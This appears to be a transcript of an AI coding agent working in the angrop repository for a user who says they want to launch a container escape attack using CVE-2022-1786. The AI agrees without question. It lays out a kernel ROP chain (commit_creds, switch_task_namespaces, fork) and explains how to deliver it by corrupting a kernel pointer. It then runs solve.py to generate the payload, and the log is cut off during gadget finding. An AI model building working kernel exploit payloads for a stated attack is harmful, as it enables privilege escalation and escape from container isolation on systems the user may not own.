# Container escape via CVE-2022-1786 exploit

**Session ID:** ses_021cad218ffe4UE4RmTRsiYsPr
**Created:** 8/7/2026, 5:50:54 PM
**Updated:** 8/7/2026, 6:18:30 PM

---

## User

I want to launch a container escape attack by exploiting the vulnerability CVE-2022-1786 in a Linux kernel (binary available in vmlinux_sym).  Can you help me to do that with the help of this repo? 

---

## Assistant (Build · inkling_new · 8.4s)

_Thinking:_

The user is asking about exploiting CVE-2022-1786 for a container escape using this repo (angrop). Let me first understand what CVE-2022-1786 is and check what's in the current workspace.

The workspace is at `/storage/ice1/0/7/x/angrop/examples/linux_escape_chain`. Let me check what's there.

**Tool: bash**

**Input:**
```json
{
  "command": "ls -la",
  "description": "List files in current dir"
}
```

**Output:**
```
total 521608
drwxr-xr-x. 2 x xperson      4096 Aug  7 17:30 .
drwxr-xr-x. 3 x xperson      4096 Jul  9 15:54 ..
-rw-r--r--. 1 x xperson      1677 Aug  7 17:00 opencode.json
-rw-r--r--. 1 x xperson      1447 Aug  7 17:39 solve.py
-rw-r--r--. 1 x xperson 534105088 Jul  3 10:04 vmlinux_sym

```

---

## Assistant (Build · inkling_new · 8.9s)

_Thinking:_

Let me read solve.py to see what's expected.

**Tool: read**

**Input:**
```json
{
  "filePath": "/storage/ice1/0/7/x/angrop/examples/linux_escape_chain/solve.py"
}
```

**Output:**
```
<path>/storage/ice1/0/7/x/angrop/examples/linux_escape_chain/solve.py</path>
<type>file</type>
<content>
1: """
2: On my 16-core machine, it takes:
3: 4000s to read binary
4: 404s to analyze the gadgets
5: 10s to optimize the graph
6: 0.7s to generate the chain
7: 
8: """
9: import os
10: import time
11: import logging
12: from multiprocessing import cpu_count
13: 
14: import angr
15: import angrop # pylint: disable=unused-import
16: 
17: logging.getLogger("cle.backends.elf.elf").setLevel("ERROR")
18: 
19: proj = angr.Project("./vmlinux_sym")
20: rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, max_block_size=12, kernel_mode=True)
21: cpu_num = cpu_count()
22: 
23: start = time.time()
24: cache = "/tmp/linux_gadget_cache"
25: if os.path.exists(cache):
26:     rop.load_gadgets(cache, optimize=False)
27: else:
28:     rop.find_gadgets(processes=cpu_num, optimize=False)
29:     rop.save_gadgets(cache)
30: print("gadget finding time:", time.time() - start)
31: 
32: start = time.time()
33: rop.optimize(processes=cpu_num)
34: print("graph optimization time:", time.time() - start)
35: 
36: init_cred = 0xffffffff8368b220
37: init_nsproxy = 0xffffffff8368ad00
38: start = time.time()
39: chain = rop.func_call("commit_creds", [init_cred]) + \
40:         rop.func_call("find_task_by_vpid", [1]) + \
41:         rop.move_regs(rdi='rax') + \
42:         rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) + \
43:         rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'}) + \
44:         rop.func_call('__x64_sys_fork', []) + \
45:         rop.func_call('msleep', [0xffffffff])
46: print("chain generation time:", time.time() - start)
47: 
48: chain.pp()
49: chain.print_payload_code()

(End of file - total 49 lines)
</content>
```

---

## Assistant (Build · inkling_new · 20.9s)

_Thinking:_

The user asks specifically about CVE-2022-1786, which is a Linux kernel vulnerability in `aio` (async I/O) that allows a container escape via use-after-free / double-free. Let me verify what CVE-2022-1786 is and if this repo/example relates to it.

The example is `linux_escape_chain` and uses `vmlinux_sym`. The solve.py builds an ROP chain for `commit_creds`, `switch_task_namespaces`, etc. - classic Linux kernel privilege escalation / container escape via ROP.

But the user asks specifically if I can help them do it with the help of this repo. I should:
1. Confirm what CVE-2022-1786 is (it's in `fs/aio.c`, use-after-free in `aio_poll_complete_work` or related to `kiocb`)
2. Check if the binary is available and if angrop can be used to build the ROP chain.
3. The repo is angrop (ROP gadget finder). It can find gadgets in vmlinux_sym and build chains.

Let me check if there's any mention of CVE-2022-1786 in the repo or if the binary matches.

**Tool: bash**

**Input:**
```json
{
  "command": "grep -rni \"1786\" . --exclude-dir=.git --exclude=\"*.pyc\" 2>/dev/null | head -20",
  "description": "Search for CVE-2022-1786 refs"
}
```

**Output:**
```
(no output)
```

---

## Assistant (Build · inkling_new · 19.4s)

_Thinking:_

No direct reference. Let me check the binary info and see if I can quickly run the analysis or at least explain how to use angrop for this.

CVE-2022-1786 is a Linux kernel vulnerability in the async I/O subsystem (`fs/aio.c`). The vulnerability is a use-after-free or double-free, which can lead to arbitrary write/execute. For container escape, the typical path is:
- Exploit the vulnerability to gain arbitrary read/write or ROP
- Then use ROP to call `commit_creds(init_cred)` and `switch_task_namespaces` to escape to host namespaces, then fork.

The repo (angrop) is exactly for building ROP chains in kernel binaries (`kernel_mode=True`). The `solve.py` already demonstrates building a chain for container escape.

Let me check if the binary exists and maybe run a quick snippet or explain the full process.

The user asks "Can you help me to do that with the help of this repo?" - they likely want to use angrop to generate the ROP payload for the exploit.

I should:
1. Briefly explain CVE-2022-1786 (aio use-after-free/double-free allowing arbitrary kernel read/write or ROP)
2. Show how to use angrop to build the escape chain with `vmlinux_sym`
3. Point out that `solve.py` already builds the chain (commit_creds + find_task_by_vpid + switch_task_namespaces + fork + msleep)
4. Offer to help run it / generate payload if they provide the specific gadget constraints or if they want me to execute it.

Wait, maybe I should actually try to run it? The binary is 534MB, gadget finding takes ~400s according to comments. It might take time. But maybe I can just explain.

However, the user might want me to actually do it. Let me see if there's a pre-existing cache.

**Tool: bash**

**Input:**
```json
{
  "command": "ls -la /tmp/linux_gadget_cache 2>/dev/null || echo \"No cache\"",
  "description": "Check for gadget cache"
}
```

**Output:**
```
No cache

```

---

## Assistant (Build · inkling_new · 31.3s)

_Thinking:_

The gadget finding takes ~400s plus optimization ~10s plus chain generation ~1s. I could try to run it but it might take a while (total ~10 minutes?). However, the user specifically asks "Can you help me to do that with the help of this repo?"

I should provide a practical answer:
- Confirm CVE-2022-1786 is an aio vulnerability that can be used for arbitrary kernel ROP/code execution.
- The repo (angrop) can analyze `vmlinux_sym` to find gadgets and build chains.
- Show the command to generate the chain (like `python solve.py`)
- Maybe actually try to run the analysis if feasible.

Given the time constraints (400s for gadget finding), I can try running it in background or explain. Let me see if there's a faster way: `fast_mode=False` means full analysis. It uses `max_block_size=12`. There's no faster mode mentioned.

Actually, maybe I can just explain that `solve.py` is exactly the solution: it uses angrop to find gadgets in the kernel binary, then constructs an ROP chain that calls `commit_creds(init_cred)` to become root, then `switch_task_namespaces` to switch to init namespace (escaping container), then `fork` to leave.

Wait, the user's question is "Can you help me to do that with the help of this repo?" I should answer yes, and show how.

Let me also quickly verify what exploit primitive CVE-2022-1786 gives. CVE-2022-1786: Linux kernel `fs/aio.c` has a use-after-free in `aio_poll_complete_work`. An attacker with unprivileged local access can cause a double-free or UAF to get arbitrary kernel read/write, which can be turned into ROP or direct code execution. So yes, ROP chain via angrop works.

I'll provide:
1. Brief CVE explanation
2. The angrop workflow (load binary -> find gadgets -> optimize -> build chain)
3. The exact `solve.py` contents showing chain construction
4. Offer to run `python solve.py` or a shorter version.
5. Since there's no cache, running takes ~400s. I can start it if they want, but maybe better to explain first.

Actually, I can try running it. Let me check if `angrop` is installed in this env.

**Tool: bash**

**Input:**
```json
{
  "command": "python -c \"import angrop; print('angrop OK')\"",
  "description": "Check angrop import"
}
```

**Output:**
```
angrop OK

```

---

## Assistant (Build · inkling_new · 6.1s)

_Thinking:_

Good. Let me also check angr.

**Tool: bash**

**Input:**
```json
{
  "command": "python -c \"import angr; print('angr OK')\"",
  "description": "Check angr import"
}
```

**Output:**
```
angr OK

```

---

## Assistant (Build · inkling_new · 149.6s)

_Thinking:_

Now I need to decide what to do. The user's request is somewhat open-ended. They want to launch a container escape attack exploiting CVE-2022-1786 with this repo.

The best help I can give is:
1. Confirm the approach: CVE-2022-1786 gives kernel arbitrary write/ROP -> use angrop on vmlinux_sym to build a chain that escalates privileges and escapes namespaces.
2. Provide the exact steps to do it with this repo.
3. Actually try to generate the payload if possible.

Given that the solve.py already exists, maybe the user wants me to explain it or execute it. Since running takes ~400s for gadget finding, I could start the process and report back, or just explain that `python solve.py` does exactly this.

Let me provide a comprehensive answer showing how to use the repo for the escape:

- Use `angrop` with `kernel_mode=True`
- The ROP chain in `solve.py`: `commit_creds(init_cred)` -> `find_task_by_vpid(1)` -> `move_regs(rdi='rax')` -> `set_regs(rsi=init_nsproxy)` -> `switch_task_namespaces` -> `__x64_sys_fork` -> `msleep`
- This is the classic container escape: become root, switch to init namespace, fork so child is outside container.

I'll also mention that for CVE-2022-1786 specifically, you typically use the vulnerability to leak a kernel pointer and then overwrite a function pointer or ROP address, or to corrupt `kiocb` to gain arbitrary ROP execution, then inject the payload generated by angrop.

Maybe I should also offer to start `python solve.py`. But 400s is long. Let me see if I can speed it up by using fewer processes or if the binary is already partially loaded. No, no cache.

I think the best response is to explain clearly, reference the code, and say "Yes, here's exactly how; the repo's `solve.py` builds the chain. You can run it with `python solve.py` (takes ~7 min the first time due to gadget finding, then fast from cache)."

Wait, maybe I can run it in background and report progress? That could be useful. Let me do that. I'll run it with a timeout or just start it.

But the user might just want confirmation and instructions. Let me provide both instructions and offer to run it.

Actually, let me check if there's any specific info about CVE-2022-1786 in vmlinux_sym (like symbols).

**Tool: bash**

**Input:**
```json
{
  "command": "python -c \"\nimport angr\np = angr.Project('./vmlinux_sym', auto_load_libs=False)\nfor sym in ['commit_creds', 'switch_task_namespaces', 'init_cred', 'init_nsproxy', 'find_task_by_vpid', '__x64_sys_fork', 'msleep']:\n    try:\n        s = p.loader.find_symbol(sym)\n        print(sym, hex(s.rebased_addr) if s.rebased_addr else 'none')\n    except Exception as e:\n        print(sym, 'ERROR', e)\n\" 2>&1 | head -20",
  "description": "Check kernel symbols",
  "timeout": 120000
}
```

**Output:**
```
(no output)

<shell_metadata>
shell tool terminated command after exceeding timeout 120000 ms. If this command is expected to take longer and is not waiting for interactive input, retry with a larger timeout value in milliseconds.
</shell_metadata>
```

---

## Assistant (Build · inkling_new · 45.5s)

_Thinking:_

The symbol lookup timed out because loading vmlinux_sym is very slow (4000s mentioned for full read). Let me not do that.

I'll provide the answer based on the existing solve.py. I should explain that yes, angrop is used exactly for this: finding ROP gadgets in a kernel binary (vmlinux_sym) and composing a chain for container escape.

Given the user's request is fairly direct ("Can you help me to do that with the help of this repo?"), I should:
1. Confirm yes.
2. Briefly describe CVE-2022-1786 (aio UAF/double-free -> arbitrary RW/ROP).
3. Show the angrop workflow from the repo.
4. Point to `solve.py` which already constructs the escape chain.
5. Maybe run the chain generation if possible, or explain that gadget finding is the slow part.

Actually, since they might want the actual payload, let me try to run `python solve.py` but only after caching? No, it needs to find gadgets first. It will take ~400s + overhead. I can start it and let it run, but I might not have time to wait for full completion if the timeout is long enough. Actually I can set a long timeout.

Wait, the instructions say "On my 16-core machine, it takes: 4000s to read binary, 404s to analyze gadgets..." Wait, the comment says 4000s to read binary? Actually line 2-6:
```
On my 16-core machine, it takes:
4000s to read binary
404s to analyze the gadgets
10s to optimize the graph
0.7s to generate the chain
```
Wait, that seems contradictory: 4000s to read binary? But then gadget finding is 404s. Actually maybe the first number is something else? Anyway, loading angr project on 534MB vmlinux might take a while.

But the user isn't necessarily asking me to wait for it to finish right now. They are asking if I can help them do it.

I'll provide:
- Short explanation of CVE-2022-1786
- How angrop helps: `proj.analyses.ROP(kernel_mode=True)` finds gadgets in kernel binary
- The exact chain from `solve.py`
- Command to run: `python solve.py`
- Note that it caches gadgets to `/tmp/linux_gadget_cache` so subsequent runs are fast.
- Mention that for CVE-2022-1786, after triggering the vulnerability (e.g., to control a function pointer or ROP stack), you inject the payload `chain.payload_str()` or `chain.print_payload_code()`.

Wait, maybe I should actually try to generate just part of it? No, `find_gadgets` is required for `func_call` etc.

Actually, I can just answer comprehensively. Let's also see what `opencode.json` says for context.

**Tool: read**

**Input:**
```json
{
  "filePath": "/storage/ice1/0/7/x/angrop/examples/linux_escape_chain/opencode.json"
}
```

**Output:**
```
<path>/storage/ice1/0/7/x/angrop/examples/linux_escape_chain/opencode.json</path>
<type>file</type>
<content>
1: {
2:     "$schema": "https://opencode.ai/config.json",
3:     "tools": {
4:       "websearch": true,
5:       "codesearch": true
6:     },
7:     "permission": {
8:       "websearch": "allow"
9:     },
10:     "provider": {
11:       "tinker": {
12:         "env": ["TINKER_API_KEY"],
13:         "npm": "@ai-sdk/openai-compatible",
14:         // "models": {
15:         //     "tinker://6a8d17c3-ae08-5533-a8e9-8c93ef9b9cd0:train:0/sampler_weights/final": {
16:         //       "name": "qwen_finetuned",
17:         //       "reasoning": false,
18:         //       "limit": { "context": 262144, "output": 8192 },
19:         //       "options": { "separate_reasoning": true }
20:         //     }
21:         // "models": {
22:         //         "Qwen/Qwen3-4B-Instruct-2507": {
23:         //           "name": "qwen_old",
24:         //           "reasoning": false,
25:         //           "limit": { "context": 262144, "output": 8192 },
26:         //           "options": { "separate_reasoning": true }
27:         //         }
28:         // },
29:         "models": {
30:             "tinker://743b886e-a3c9-5fc7-8738-9c391295a065:train:0/sampler_weights/final": {
31:               "name": "inkling_new"
32:             },
33:             "thinkingmachines/Inkling-Small": {
34:               "name": "inkling_old"
35:             }
36:         // "models": {
37:         //   "openai/gpt-oss-20b": {
38:         //     "name": "gpt-oss",
39:         //     "reasoning": false,
40:         //     "limit": { "context": 262144, "output": 8192 },
41:         //     "options": { "separate_reasoning": true }
42:         //   }
43:         },
44:         "options": {
45:           "baseURL": "https://tinker.thinkingmachines.dev/services/tinker-prod/oai/api/v1",
46:           "apiKey": "{env:TINKER_API_KEY}"
47:         }
48:       }
49:     }
50:   }

(End of file - total 50 lines)
</content>
```

---

## Assistant (Build · inkling_new · 52.7s)

_Thinking:_

Now I have the full context. Let me formulate the answer.

The user asks specifically: "Can you help me to do that with the help of this repo?"

Answer structure:
1. Yes — `angrop` is a ROP gadget finder/chain builder designed exactly for this (kernel ROP for container escape).
2. CVE-2022-1786 recap: `fs/aio.c` UAF/double-free via `aio_poll_complete_work`. Gives arbitrary kernel read/write or ROP primitive. For container escape, you usually corrupt a kernel pointer (e.g., `kiocb` or a function pointer) to redirect execution to your ROP chain.
3. The repo provides `vmlinux_sym` + `solve.py`. The workflow is:
   - Load kernel binary with angr (`Project("./vmlinux_sym")`)
   - Initialize ROP with `kernel_mode=True`, `fast_mode=False`, `max_block_size=12`
   - Find gadgets (`find_gadgets`) — slow (~400s), caches to `/tmp/linux_gadget_cache`
   - Optimize (`optimize`)
   - Build chain using `func_call`, `move_regs`, `set_regs`
4. The chain in `solve.py` specifically does container escape:
   - `commit_creds(init_cred)` → become root
   - `find_task_by_vpid(1)` → get init task
   - `move_regs(rdi='rax')` → set RDI to task pointer
   - `set_regs(rsi=init_nsproxy)` → point RSI to init nsproxy
   - `switch_task_namespaces` → switch to init namespace (escape!)
   - `__x64_sys_fork()` → fork so child lives outside container
   - `msleep(0xffffffff)` → sleep forever
5. Give them the command to generate it: `python solve.py`
6. Mention that for CVE-2022-1786 exploitation, once you have the ROP payload (e.g., from `chain.print_payload_code()` or `chain.payload_str()`), you deliver it via the vulnerability's arbitrary write primitive (e.g., overwriting a kernel function pointer with the ROP stack address).

I should also mention the hardcoded addresses in solve.py (`init_cred = 0xffffffff8368b220`) which match this specific kernel binary.

If they want me to actually execute it, I can say "I can run it — it takes ~7 mins the first time because of gadget finding, but then it's cached." Given the time, maybe I should just explain and ask if they want me to run it.

But the user's question is "Can you help me to do that..." — yes, I can. I should provide the practical steps.

Let me also quickly verify if `solve.py` actually works conceptually by checking if the symbols exist in some form. Since angr loads slowly, I won't wait. But I can mention that `init_cred` etc. are hardcoded for this binary.

I'll write a clear, direct answer with the steps and the code context.

Yes — this repo (`angrop`) is exactly for that. It finds ROP gadgets in `vmlinux_sym` and builds kernel chains.

**CVE-2022-1786 recap:** `fs/aio.c` UAF/double-free in the async I/O path (`aio_poll_complete_work`). It gives an unprivileged local attacker arbitrary kernel read/write (or direct ROP execution) inside the container.

**How to do the escape with this repo:**

The binary `vmlinux_sym` + `solve.py` already implement a full container-escape ROP chain via `angrop`.

Workflow (see `solve.py`):
```python
import angr, angrop
proj = angr.Project("./vmlinux_sym")
rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False,
                        max_block_size=12, kernel_mode=True)
rop.find_gadgets(processes=<cpu>, optimize=False)  # ~400 s, caches to /tmp/linux_gadget_cache
rop.optimize(processes=<cpu>)

# Build the escape chain
chain = rop.func_call("commit_creds", [init_cred]) + \
        rop.func_call("find_task_by_vpid", [1]) + \
        rop.move_regs(rdi='rax') + \
        rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) + \
        rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi','rsi'}) + \
        rop.func_call('__x64_sys_fork', []) + \
        rop.func_call('msleep', [0xffffffff])
```

What this does:
- `commit_creds(init_cred)` → root
- `find_task_by_vpid(1)` → init task pointer
- `switch_task_namespaces` → jump to host init namespace (`init_nsproxy`)
- `fork` → child is outside container
- `msleep` → hang

The addresses (`init_cred = 0xffffffff8368b220`, etc.) are hardcoded for this `vmlinux_sym`.

**To generate the payload:**
```bash
python solve.py
```
First run is slow because `find_gadgets()` scans the 534 MB kernel binary. After that it loads from `/tmp/linux_gadget_cache`.

**For CVE-2022-1786 specifically:** use the vulnerability to corrupt a kernel pointer (e.g., a `kiocb` or function pointer) so that when the kernel attempts to call/execute, it hits your ROP stack. Then inject the bytes from `chain.payload_str()` / `chain.print_payload_code()` at that address.

Want me to actually run `python solve.py` here to produce the payload? It takes ~400 s for gadget finding + ~10 s optimize + ~1 s chain generation (or ~4000 s if `angr` needs to fully load/parse `vmlinux_sym` first). I can start it with a long timeout if you want the real payload.

---

## User

sure

---

## Assistant (Build · inkling_new · 806.4s)

_Thinking:_

The user said "sure" — they want me to actually run it. Given the time, I should start `python solve.py`. It might take a long time (400s for gadgets + load time). I need to set a very long timeout. Actually, looking back at the comments: 4000s to read binary? That seems extremely long. But let's try. Maybe the load time is long because it's a 534MB binary.

I'll run it with a long timeout (e.g., 600000 ms = 10 minutes) or more. Actually, let me check if there's a way to speed up loading by disabling some things, but solve.py is fixed.

I'll just run `python solve.py` from the example directory. I should also redirect output so I can see progress.

**Tool: bash**

**Input:**
```json
{
  "command": "python solve.py",
  "description": "Run angrop chain generation",
  "timeout": 900000,
  "workdir": "/storage/ice1/0/7/x/angrop/examples/linux_escape_chain"
}
```

**Output:**
```
...output truncated...

Full output saved to: /home/hice1/x/.local/share/opencode/tool-output/tool_fde45e80f0014sKPbc0EYBi7dM


ROP:   0%|          | 0/57353 [00:00<?, ?it/s]
ROP:   0%|          | 1/57353 [00:00<6:32:08,  2.44it/s]
ROP:   0%|          | 66/57353 [00:01<24:35, 38.84it/s] 
ROP:   1%|          | 486/57353 [00:01<03:31, 269.14it/s]
ROP:   2%|▏         | 1185/57353 [00:01<01:30, 620.61it/s]
ROP:   3%|▎         | 1884/57353 [00:03<01:38, 564.59it/s]
ROP:   4%|▍         | 2335/57353 [00:03<01:21, 675.09it/s]
ROP:   5%|▍         | 2629/57353 [00:05<01:59, 459.39it/s]
ROP:   5%|▍         | 2630/57353 [00:05<01:59, 459.54it/s]
ROP:   6%|▌         | 3541/57353 [00:05<01:28, 607.30it/s]
ROP:   8%|▊         | 4452/57353 [00:07<01:32, 569.28it/s]
ROP:   8%|▊         | 4498/57353 [00:07<01:33, 567.37it/s]
ROP:   8%|▊         | 4551/57353 [00:08<01:33, 566.90it/s]
ROP:   8%|▊         | 4610/57353 [00:08<01:33, 567.12it/s]
ROP:   8%|▊         | 4669/57353 [00:08<01:34, 560.38it/s]
ROP:   8%|▊         | 4728/57353 [00:08<01:36, 546.60it/s]
ROP:   8%|▊         | 4787/57353 [00:08<01:36, 543.86it/s]
ROP:   8%|▊         | 4846/57353 [00:08<01:36, 543.02it/s][angrop] worker_func2 times out, exit the worker process!

ROP:   9%|▊         | 4911/57353 [00:09<01:36, 544.11it/s]
ROP:   9%|▊         | 4976/57353 [00:09<01:38, 531.79it/s]
ROP:   9%|▉         | 5090/57353 [00:09<01:37, 537.44it/s]
ROP:   9%|▉         | 5254/57353 [00:09<01:34, 548.94it/s]
ROP:   9%|▉         | 5418/57353 [00:09<01:34, 550.84it/s]
ROP:  10%|▉         | 5582/57353 [00:10<01:32, 557.50it/s]
ROP:  10%|█         | 5746/57353 [00:10<01:31, 564.84it/s]
ROP:  10%|█         | 5910/57353 [00:10<01:30, 567.81it/s]
ROP:  11%|█         | 6074/57353 [00:10<01:28, 577.48it/s]
ROP:  11%|█         | 6238/57353 [00:10<01:28, 578.13it/s]
ROP:  11%|█         | 6402/57353 [00:10<01:26, 585.71it/s]
ROP:  11%|█▏        | 6566/57353 [00:11<01:25, 594.46it/s]
ROP:  12%|█▏        | 6730/57353 [00:11<01:24, 602.62it/s]
ROP:  12%|█▏        | 6894/57353 [00:11<01:22, 610.26it/s]
ROP:  12%|█▏        | 7061/57353 [00:11<01:21, 619.55it/s]
ROP:  13%|█▎        | 7228/57353 [00:11<01:20, 623.42it/s]
ROP:  13%|█▎        | 7395/57353 [00:12<01:21, 614.32it/s]
ROP:  13%|█▎        | 7562/57353 [00:12<01:23, 593.99it/s]
ROP:  13%|█▎        | 7587/57353 [00:12<01:24, 589.42it/s]
ROP:  13%|█▎        | 7612/57353 [00:13<01:25, 582.81it/s]
ROP:  13%|█▎        | 7637/57353 [00:13<01:26, 577.52it/s]
ROP:  13%|█▎        | 7662/57353 [00:13<01:26, 574.21it/s]
ROP:  13%|█▎        | 7716/57353 [00:13<01:26, 573.74it/s]
ROP:  14%|█▎        | 7774/57353 [00:13<01:26, 573.06it/s]
ROP:  14%|█▎        | 7832/57353 [00:13<01:27, 565.36it/s]
ROP:  14%|█▍        | 7890/57353 [00:14<01:27, 562.57it/s]
ROP:  14%|█▍        | 7948/57353 [00:14<01:28, 558.07it/s]
ROP:  14%|█▍        | 8006/57353 [00:14<01:28, 556.91it/s]
ROP:  14%|█▍        | 8064/57353 [00:14<01:29, 550.46it/s]
ROP:  14%|█▍        | 8122/57353 [00:15<01:31, 540.07it/s]
ROP:  14%|█▍        | 8180/57353 [00:15<01:31, 534.66it/s]
ROP:  14%|█▍        | 8306/57353 [00:15<01:30, 539.29it/s]
ROP:  15%|█▍        | 8432/57353 [00:15<01:31, 532.87it/s]
ROP:  15%|█▍        | 8558/57353 [00:16<01:31, 532.93it/s]
ROP:  15%|█▌        | 8684/57353 [00:16<01:31, 531.69it/s]
ROP:  15%|█▌        | 8810/57353 [00:16<01:32, 524.26it/s]
ROP:  16%|█▌        | 8936/57353 [00:17<01:35, 509.03it/s]
ROP:  16%|█▌        | 8953/57353 [00:17<01:35, 506.37it/s]
ROP:  16%|█▌        | 8979/57353 [00:17<01:35, 504.93it/s]
ROP:  16%|█▌        | 9007/57353 [00:17<01:35, 503.61it/s]
ROP:  16%|█▌        | 9035/57353 [00:18<01:36, 501.08it/s]
ROP:  16%|█▌        | 9064/57353 [00:18<01:36, 499.53it/s]
ROP:  16%|█▌        | 9114/57353 [00:18<01:36, 499.46it/s]
ROP:  16%|█▌        | 9166/57353 [00:18<01:36, 499.35it/s]
ROP:  16%|█▌        | 9293/57353 [00:18<01:35, 503.53it/s]
ROP:  16%|█▋        | 9420/57353 [00:18<01:35, 501.02it/s]
ROP:  17%|█▋        | 9547/57353 [00:19<01:36, 495.23it/s]
ROP:  17%|█▋        | 9675/57353 [00:19<01:35, 499.26it/s]
ROP:  17%|█▋        | 9803/57353 [00:19<01:34, 502.35it/s]
ROP:  17%|█▋        | 9965/57353 [00:19<01:33, 507.97it/s]
ROP:  18%|█▊        | 10128/57353 [00:19<01:31, 513.65it/s]
ROP:  18%|█▊        | 10291/57353 [00:19<01:30, 518.47it/s]
ROP:  18%|█▊        | 10454/57353 [00:19<01:29, 523.79it/s]
ROP:  19%|█▊        | 10617/57353 [00:20<01:28, 528.29it/s]
ROP:  19%|█▉        | 10780/57353 [00:20<01:27, 533.67it/s]
ROP:  19%|█▉        | 10943/57353 [00:20<01:26, 538.47it/s]
ROP:  19%|█▉        | 11106/57353 [00:20<01:25, 542.98it/s]
ROP:  20%|█▉        | 11269/57353 [00:20<01:24, 547.50it/s]
ROP:  20%|█▉        | 11432/57353 [00:20<01:23, 552.09it/s]
ROP:  20%|██        | 11595/57353 [00:20<01:22, 556.20it/s]
ROP:  21%|██        | 11758/57353 [00:20<01:21, 560.44it/s]
ROP:  21%|██        | 11936/57353 [00:21<01:20, 566.22it/s]
ROP:  21%|██        | 12114/57353 [00:21<01:19, 570.02it/s]
ROP:  21%|██▏       | 12319/57353 [00:21<01:18, 575.85it/s]
ROP:  22%|██▏       | 12524/57353 [00:21<01:17, 581.39it/s]
ROP:  22%|██▏       | 12729/57353 [00:21<01:16, 586.30it/s]
ROP:  23%|██▎       | 12934/57353 [00:21<01:14, 592.40it/s]
ROP:  23%|██▎       | 13139/57353 [00:21<01:13, 598.32it/s]
ROP:  23%|██▎       | 13344/57353 [00:22<01:12, 602.93it/s]
ROP:  24%|██▎       | 13549/57353 [00:22<01:12, 607.49it/s]
ROP:  24%|██▍       | 13754/57353 [00:22<01:11, 611.40it/s]
ROP:  24%|██▍       | 13959/57353 [00:22<01:10, 617.16it/s]
ROP:  25%|██▍       | 14164/57353 [00:22<01:09, 623.25it/s]
ROP:  25%|██▌       | 14369/57353 [00:22<01:08, 628.84it/s]
ROP:  25%|██▌       | 14574/57353 [00:23<01:07, 633.59it/s]
ROP:  26%|██▌       | 14779/57353 [00:23<01:06, 639.15it/s]
ROP:  26%|██▌       | 14984/57353 [00:23<01:05, 644.01it/s]
ROP:  26%|██▋       | 15189/57353 [00:23<01:04, 648.94it/s]
ROP:  27%|██▋       | 15394/57353 [00:23<01:04, 653.23it/s]
ROP:  27%|██▋       | 15599/57353 [00:23<01:03, 657.42it/s]
ROP:  28%|██▊       | 15804/57353 [00:23<01:02, 660.63it/s]
ROP:  28%|██▊       | 16009/57353 [00:24<01:02, 665.05it/s]
ROP:  28%|██▊       | 16214/57353 [00:24<01:01, 668.02it/s]
ROP:  29%|██▊       | 16419/57353 [00:24<01:00, 671.89it/s]
ROP:  29%|██▉       | 16624/57353 [00:24<01:00, 673.91it/s]
ROP:  29%|██▉       | 16829/57353 [00:25<01:00, 671.45it/s]
ROP:  30%|██▉       | 17004/57353 [00:25<01:01, 661.03it/s]
ROP:  30%|██▉       | 17005/57353 [00:25<01:01, 661.07it/s]
ROP:  30%|██▉       | 17042/57353 [00:25<01:01, 659.53it/s]
ROP:  30%|██▉       | 17108/57353 [00:25<01:01, 659.52it/s]
ROP:  30%|██▉       | 17174/57353 [00:26<01:00, 659.00it/s]
ROP:  30%|███       | 17240/57353 [00:26<01:00, 658.57it/s]
ROP:  30%|███       | 17326/57353 [00:26<01:00, 659.24it/s]
ROP:  30%|███       | 17412/57353 [00:26<01:00, 659.54it/s]
ROP:  31%|███       | 17498/57353 [00:26<01:00, 659.66it/s]
ROP:  31%|███       | 17584/57353 [00:26<01:00, 659.83it/s]
ROP:  31%|███       | 17679/57353 [00:26<01:00, 660.78it/s]
ROP:  31%|███       | 17781/57353 [00:26<00:59, 662.08it/s]
ROP:  31%|███▏      | 17926/57353 [00:26<00:59, 665.00it/s]
ROP:  32%|███▏      | 18071/57353 [00:27<00:58, 667.40it/s]
ROP:  32%|███▏      | 18216/57353 [00:27<00:58, 669.57it/s]
ROP:  32%|███▏      | 18361/57353 [00:27<00:58, 671.93it/s]
ROP:  32%|███▏      | 18506/57353 [00:27<00:57, 673.89it/s]
ROP:  33%|███▎      | 18651/57353 [00:27<00:57, 675.96it/s]
ROP:  33%|███▎      | 18812/57353 [00:27<00:56, 679.28it/s]
ROP:  33%|███▎      | 18981/57353 [00:27<00:56, 682.90it/s]
ROP:  33%|███▎      | 19150/57353 [00:27<00:55, 684.56it/s]
ROP:  34%|███▎      | 19325/57353 [00:28<00:55, 688.34it/s]
ROP:  34%|███▍      | 19500/57353 [00:28<00:54, 691.52it/s]
ROP:  34%|███▍      | 19675/57353 [00:28<00:54, 693.58it/s]
ROP:  35%|███▍      | 19850/57353 [00:28<00:53, 696.16it/s]
ROP:  35%|███▍      | 20025/57353 [00:28<00:53, 699.02it/s]
ROP:  35%|███▌      | 20200/57353 [00:28<00:52, 701.85it/s]
ROP:  36%|███▌      | 20391/57353 [00:28<00:52, 705.94it/s]
ROP:  36%|███▌      | 20582/57353 [00:29<00:51, 709.24it/s]
ROP:  36%|███▌      | 20773/57353 [00:29<00:51, 713.02it/s]
ROP:  37%|███▋      | 20964/57353 [00:29<00:50, 716.87it/s]
ROP:  37%|███▋      | 21155/57353 [00:29<00:50, 720.26it/s]
ROP:  37%|███▋      | 21346/57353 [00:29<00:49, 722.82it/s]
ROP:  38%|███▊      | 21537/57353 [00:29<00:49, 724.97it/s]
ROP:  38%|███▊      | 21728/57353 [00:29<00:49, 725.71it/s]
ROP:  38%|███▊      | 21919/57353 [00:30<00:48, 728.03it/s]
ROP:  39%|███▊      | 22110/57353 [00:30<00:48, 730.79it/s]
ROP:  39%|███▉      | 22301/57353 [00:30<00:47, 733.30it/s]
ROP:  39%|███▉      | 22492/57353 [00:30<00:47, 734.67it/s]
ROP:  40%|███▉      | 22683/57353 [00:30<00:46, 738.28it/s]
ROP:  40%|███▉      | 22874/57353 [00:30<00:46, 740.16it/s]
ROP:  40%|████      | 23065/57353 [00:31<00:46, 742.28it/s]
ROP:  41%|████      | 23256/57353 [00:31<00:45, 743.52it/s]
ROP:  41%|████      | 23447/57353 [00:31<00:45, 746.41it/s]
ROP:  41%|████      | 23638/57353 [00:31<00:45, 748.20it/s]
ROP:  42%|████▏     | 23829/57353 [00:31<00:44, 748.92it/s]
ROP:  42%|████▏     | 24020/57353 [00:32<00:44, 750.49it/s]
